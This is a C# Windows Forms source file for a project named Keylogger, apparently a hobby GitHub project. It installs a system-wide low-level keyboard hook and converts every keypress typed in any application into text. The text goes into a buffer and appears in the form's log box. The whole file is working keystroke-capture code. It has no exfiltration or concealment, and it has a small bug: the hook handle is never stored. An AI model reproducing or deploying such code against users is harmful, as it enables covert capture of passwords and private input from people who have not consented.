using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Keylogger
{
    public partial class Form1 : Form
    {
        static readonly int WH_KEYBOARD_LL = 13;
        static int hHook = 0;
        static StringBuilder buffer = new StringBuilder(256);

        delegate int HookProc(int code, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll")]
        static extern int CallNextHookEx(int hHook, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Auto)]
        static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("user32.dll", SetLastError = true)]
        static extern bool GetKeyboardState(byte[] lpKeyState);

        [DllImport("user32.dll", SetLastError = true)]
        static extern short GetKeyState(int key);

        [DllImport("user32.dll")]
        static extern int ToUnicode(uint virtualKeyCode, uint scanCode, byte[] keyboardState,
            [Out, MarshalAs(UnmanagedType.LPWStr, SizeConst = 64)]
            StringBuilder receivingBuffer, int bufferSize, uint flags);

        [StructLayout(LayoutKind.Sequential)]
        public class KBDLLHOOKSTRUCT
        {
            public uint vkCode;
            public uint scanCode;
            public KBDLLHOOKSTRUCTFlags flags;
            public uint time;
            public UIntPtr dwExtraInfo;
        }

        [Flags]
        public enum KBDLLHOOKSTRUCTFlags : uint
        {
            LLKHF_EXTENDED = 0x01,
            LLKHF_INJECTED = 0x10,
            LLKHF_ALTDOWN = 0x20,
            LLKHF_UP = 0x80,
        }

        static readonly int ShiftKey = 16;
        static readonly int CapitalKey = 20;
        static readonly int ControlKey = 17;
        static readonly int MenuKey = 18;
        static readonly int VK_CAPITAL = 0x14;
        static readonly int MASK_UP = (1 << 15);

        static bool shift_active() => (GetKeyState(ShiftKey) & MASK_UP) != 0;
        static bool capital_active() => (GetKeyState(VK_CAPITAL) & 1) == 1;
        static bool menu_active() => (GetKeyState(MenuKey) & 1) == 1;

        public static int KbdHook(int code, IntPtr wParam, IntPtr lParam)
        {
            if (code < 0)
                return CallNextHookEx(hHook, code, wParam, lParam);

            int c = (int)wParam;
            KBDLLHOOKSTRUCT kbd = (KBDLLHOOKSTRUCT)Marshal.PtrToStructure(lParam, typeof(KBDLLHOOKSTRUCT));
            bool onKey = (c == 0x100 || c == 0x104); // WM_KEYDOWN, WM_SYSKEYDOWN

            if (onKey)
            {
                byte[] keyboardState = new byte[256];
                bool shift_on = shift_active();
                bool caps_on = capital_active();
                bool menu_on = menu_active();

                GetKeyboardState(keyboardState);
                keyboardState[ShiftKey] = (byte)(shift_on ? 0xff : 0);
                keyboardState[CapitalKey] = (byte)(caps_on ? 1 : 0);

                StringBuilder buf = new StringBuilder(256);
                int res = ToUnicode(kbd.vkCode, kbd.scanCode, keyboardState, buf, 256, 0);

                if (res > 0)
                {
                    string pressedKey = buf.ToString();

                    buffer.Append(buf.ToString());
                    if (Regex.IsMatch(pressedKey, @"[.!?]"))
                        pressedKey += Environment.NewLine;

                    if (Application.OpenForms["Form1"] is Form1 form)
                    {
                        form.Invoke((MethodInvoker)(() => form.rtxtLog.AppendText(pressedKey)));
                    }
                }
                else if (res == -1)
                {
                    ToUnicode(kbd.vkCode, kbd.scanCode, keyboardState, new StringBuilder(256), 256, 0);
                }
            }
            return CallNextHookEx(hHook, code, wParam, lParam);
        }

        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            IntPtr hMod = GetModuleHandle(Process.GetCurrentProcess().MainModule.ModuleName);
            SetWindowsHookEx(WH_KEYBOARD_LL, new HookProc(KbdHook), hMod, 0);
        }

        private void llbnProjeLink_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            Process.Start("chrome", "Github.com");
        }

        private void llbnProfilLink_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            Process.Start("chrome", "Github.com/BilalAbic");
        }
         
    }
}
